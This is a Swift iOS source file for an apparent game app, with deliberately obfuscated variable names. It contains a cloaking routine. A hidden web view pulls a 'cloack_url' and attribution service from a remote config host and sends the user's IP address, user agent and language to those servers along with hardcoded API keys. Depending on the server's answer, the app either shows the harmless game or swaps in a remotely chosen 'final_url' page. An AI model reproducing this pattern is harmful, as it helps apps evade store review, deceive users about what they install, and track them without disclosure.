import Foundation
import SwiftUI
import OneSignal
import WebKit


struct CustomCarnaval: View {
    @State var cvpxgdbigcj: String = ""
    @State var hhlcjft: String = ""
    @State var iihssn = false
    @State var fbpo = false
    @State var brrqxw: String = ""
    @State var ygls: Bool = false
    @State var oaeny: Bool = false
    @ObservedObject var jgnmxa: CarnavalViewModel = CarnavalViewModel()
    @AppStorage("vqgwyhjbsdv") var opnyxb: Bool = true
    @AppStorage("yqghjbdv") var wkfvz: Bool = true
    @AppStorage("tueyhdfbv") var fmo: Bool = true
    @State var muv:  String = "ywihsdfgusdfh"
    @State var vrnwztrdf: String = ""
    var body: some View {
        ZStack{
            Image(.backMain).resizable().ignoresSafeArea(.all)
            CarnavalLoad(rqpffjacyvop: .constant(true), style: .large)
                .frame(width: CustomUIScreen.vbjaualw / 2.1, height: CustomUIScreen.jxyawqqd / 5.1).onAppear{
            }
            
            if muv == "jjhvghujbsfv" || muv == "vsdvdsredfb"{
                if self.opnyxb{
                    ZStack{
                        Image(.backMain).resizable().ignoresSafeArea(.all)
                        CarnavalPres(dgrv: $cvpxgdbigcj, qyrmofatgzk: $hhlcjft, iddp: $iihssn, yrmueyekn: $fbpo).onAppear{}
                        Image(.backMain).resizable().ignoresSafeArea(.all)
                        CarnavalLoad(rqpffjacyvop: .constant(true), style: .large).frame(width: CustomUIScreen.vbjaualw / 2.1,
                                                                                          height: CustomUIScreen.jxyawqqd / 5.1)
                    }
                }
                if iihssn || !self.wkfvz {
                    ZStack{
                        SecondPepperLoad(tvbabssffav: jgnmxa)
                    }.onAppear{
                        ygls.toggle()
                        self.opnyxb = false
                        self.wkfvz = false
                    }
                }
                if fbpo || !self.fmo{
                    ZStack{
                        Image(.backMain).resizable().ignoresSafeArea(.all)
                        PepperushApp().onAppear{
                            
                            AppDelegate.shared = UIInterfaceOrientationMask.portrait
                            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
                            UINavigationController.attemptRotationToDeviceOrientation()
                            
                        }
                    }
                }
            }
        }.onAppear{
            OneSignal.promptForPushNotifications(userResponse: { accepted in
                if accepted {
                    muv = "jjhvghujbsfv"
                    ygls.toggle()
                } else {
                    muv = "vsdvdsredfb"
                    ygls.toggle()
                }
            })
            if let url = URL(string: "https://essaysunrise.store/chilicarnival/chilicarnival.json") {
                URLSession.shared.dataTask(with: url) { data, response, error in
                    if let data = data {
                        if let json = try? JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                            if let value2 = json["mbjfngbkf"] as? String {
                                DispatchQueue.main.async {
                                    self.cvpxgdbigcj = value2
                                }
                            }
                        }
                    }
                }.resume()
            }
        }
    }
    
    struct CarnavalPres: UIViewRepresentable {
        @Binding var dgrv: String
        @Binding var qyrmofatgzk: String
        @Binding var iddp: Bool
        @Binding var yrmueyekn: Bool
        @AppStorage("tueyhdfbv") var bikdxehxsxzchp: Bool = true
        
        func makeUIView(context: Context) -> WKWebView {
            let webView = WKWebView()
            webView.navigationDelegate = context.coordinator
            if let url = URL(string: dgrv) {
                var request = URLRequest(url: url)
                request.httpMethod = "GET"
                request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                let jeu = ["apikey": "rEzb85iRofqK7uQCMHYycmhRTFivDLhB",
                           "bundle": "com.raisamelnyk.chilicarnival"]
                for (key, value) in jeu {
                    request.setValue(value, forHTTPHeaderField: key)
                }
                webView.load(request)
            }
            return webView
        }
        
        func updateUIView(_ uiView: WKWebView, context: Context) {}
        func makeCoordinator() -> JokerMainP {
            JokerMainP(self)
        }
        class JokerMainP: NSObject, WKNavigationDelegate {
            var parent: CarnavalPres
            var syyuicygf: String?
            var yzsazarnaj: String?
            @AppStorage("fdxrtfyghvjhfc") var inbkmi: String = "ttqfghjbsdv"
            init(_ webView: CarnavalPres) {
                self.parent = webView
            }
            
            func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
                webView.evaluateJavaScript("document.documentElement.outerHTML.toString()") { (html: Any?, error: Error?) in
                    guard let htmlString = html as? String else {
                        
                        return
                    }
                    
                    self.presentSthFirst(htmlString)
                    webView.evaluateJavaScript("navigator.userAgent") { (result, error) in
                        if let yzsazarnaj = result as? String {
                            self.yzsazarnaj = yzsazarnaj
                        } else {
                        }
                    }
                    
                }
            }
            func presentSthFirst(_ htmlString: String) {
                guard let pdnxumbffqn = jojeko(from: htmlString) else {
                     return
                }
                let iquaepmiid = pdnxumbffqn.trimmingCharacters(in: .whitespacesAndNewlines)
                guard let jsonData = iquaepmiid.data(using: .utf8) else {
                     return
                }
                do {
                    let snuqu = try JSONSerialization.jsonObject(with: jsonData, options: []) as? [String: Any]
                    guard let quyeihjbdbf = snuqu?["cloack_url"] as? String else {
                         return
                    }
                    guard let hegvuhjbdf = snuqu?["atr_service"] as? String else {
                         return
                    }
                    DispatchQueue.main.async {
                        self.parent.dgrv = quyeihjbdbf
                        self.parent.qyrmofatgzk = hegvuhjbdf
                    }
                     self.masterio(with: quyeihjbdbf)
                    
                } catch {
                }
            }
            func jojeko(from htmlString: String) -> String? {
                guard let startRange = htmlString.range(of: "{"),
                      let endRange = htmlString.range(of: "}", options: .backwards) else {
                     
                    return nil
                }
                let pdnxumbffqn = String(htmlString[startRange.lowerBound..<endRange.upperBound])
                return pdnxumbffqn
            }
            func masterio(with url: String) {
                guard let secondURL = URL(string: url) else {
                    
                    return
                }
                jokerfors { syyuicygf in
                    guard let syyuicygf = syyuicygf else {
                        return
                    }
                    self.syyuicygf = syyuicygf
                    var request = URLRequest(url: secondURL)
                    request.httpMethod = "GET"
                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    let jeu = [
                        "apikeyapp": "zNOamuWKib6yITgt2iUq6HCT",
                        "ip": self.syyuicygf ?? "",
                        "useragent": self.yzsazarnaj ?? "",
                        "langcode": Locale.preferredLanguages.first ?? "Unknown"
                    ]
                    for (key, value) in jeu {
                        request.setValue(value, forHTTPHeaderField: key)
                    }
                    URLSession.shared.dataTask(with: request) { data, response, error in
                        if let error = error {
                            DispatchQueue.main.async {
                                self.parent.yrmueyekn = true
                                self.parent.bikdxehxsxzchp = false
                            }
                            return
                        }
                        if let httpResponse = response as? HTTPURLResponse {
                            if httpResponse.statusCode == 200 {
                                self.breaker()
                            } else {
                                DispatchQueue.main.async {
                                    self.inbkmi = "kjhughbjknbhjghjwevwev"
                                    self.parent.yrmueyekn = true
                                    self.parent.bikdxehxsxzchp = false
                                }
                            }
                        }
                    }.resume()
                }
            }
            
            func breaker() {
                let mspj = self.parent.qyrmofatgzk
                guard let thirdURL = URL(string: mspj) else {
                    return
                }
                var request = URLRequest(url: thirdURL)
                request.httpMethod = "GET"
                request.setValue("application/json", forHTTPHeaderField: "Content-Type")
              
                let jeu = [
                    "apikeyapp": "zNOamuWKib6yITgt2iUq6HCT",
                    "ip":  self.syyuicygf ?? "",
                    "useragent": self.yzsazarnaj ?? "",
                    "langcode": Locale.preferredLanguages.first ?? "Unknown"
                ]
                
                for (key, value) in jeu {
                    request.setValue(value, forHTTPHeaderField: key)
                }
                
                URLSession.shared.dataTask(with: request) { data, response, error in
                    guard let data = data, error == nil else {
                        return
                    }
                    if let htR = response as? HTTPURLResponse {
                    }
                    if let resS = String(data: data, encoding: .utf8) {
                        
                        do {
                            let snuqu = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any]
                            guard let cdtrygvb = snuqu?["final_url"] as? String,
                                  let vcfytughvb = snuqu?["push_sub"] as? String,
                                  let drxtyfgvjhb = snuqu?["os_user_key"] as? String else {
                                 
                                return
                            }
                            CarnavalOtherClass.shared.vdhhf = cdtrygvb
                            CarnavalOtherClass.shared.zzrqhr = vcfytughvb
                            CarnavalOtherClass.shared.cvxuoztq = drxtyfgvjhb
                            OneSignal.setExternalUserId(CarnavalOtherClass.shared.cvxuoztq ?? "")
                            OneSignal.sendTag("sub_app", value: CarnavalOtherClass.shared.zzrqhr ?? "")
                            self.parent.iddp = true
                        } catch {
                        }
                    }
                }.resume()
            }
            func mistakerOr(with data: Data) {}
            func jokerfors(completion: @escaping (String?) -> Void) {
                let url = URL(string: "https://api.ipify.org")!
                let fvwnayaulzi = URLSession.shared.dataTask(with: url) { data, response, error in
                    guard let data = data, let syyuicygf = String(data: data, encoding: .utf8) else {
                        completion(nil)
                        return
                    }
                    completion(syyuicygf)
                }
                fvwnayaulzi.resume()
            }
        }
    }
}
struct CarnavalLoad: UIViewRepresentable {
    @Binding var rqpffjacyvop: Bool
    let style: UIActivityIndicatorView.Style
    func makeUIView(context: UIViewRepresentableContext<CarnavalLoad>) -> UIActivityIndicatorView {
        return UIActivityIndicatorView(style: style)
    }
    func updateUIView(_ uiView: UIActivityIndicatorView, context: UIViewRepresentableContext<CarnavalLoad>) {
        rqpffjacyvop ? uiView.startAnimating() : uiView.stopAnimating()
    }
}

struct CustomLoading<Content>: View where Content: View {
    @Binding var jfbbzp: Bool
    var content: () -> Content
     var body: some View {
        GeometryReader { geometry in
            ZStack(alignment: .center) {
                Image(.backMain)
                    .resizable()
                    .ignoresSafeArea()
                self.content()
                    .disabled(self.jfbbzp)
                    .blur(radius: self.jfbbzp ? 3 : 0)
                CarnavalLoad(rqpffjacyvop: $jfbbzp, style: .large)
                    .frame(width: geometry.size.width / 2.1,
                           height: geometry.size.height / 5.1)
                    .shadow(color: .black, radius: 10, x: 5, y:5)
                .cornerRadius(18)
                .opacity(self.jfbbzp ? 1 : 0)
            }
        }
    }
}
extension CustomUIScreen {
  static let owcivmsr = CustomUIScreen.main.bounds.size
  static let jxyawqqd = CustomUIScreen.main.bounds.size.height
  static let vbjaualw = CustomUIScreen.main.bounds.size.width
}

typealias CustomUIScreen = UIScreen
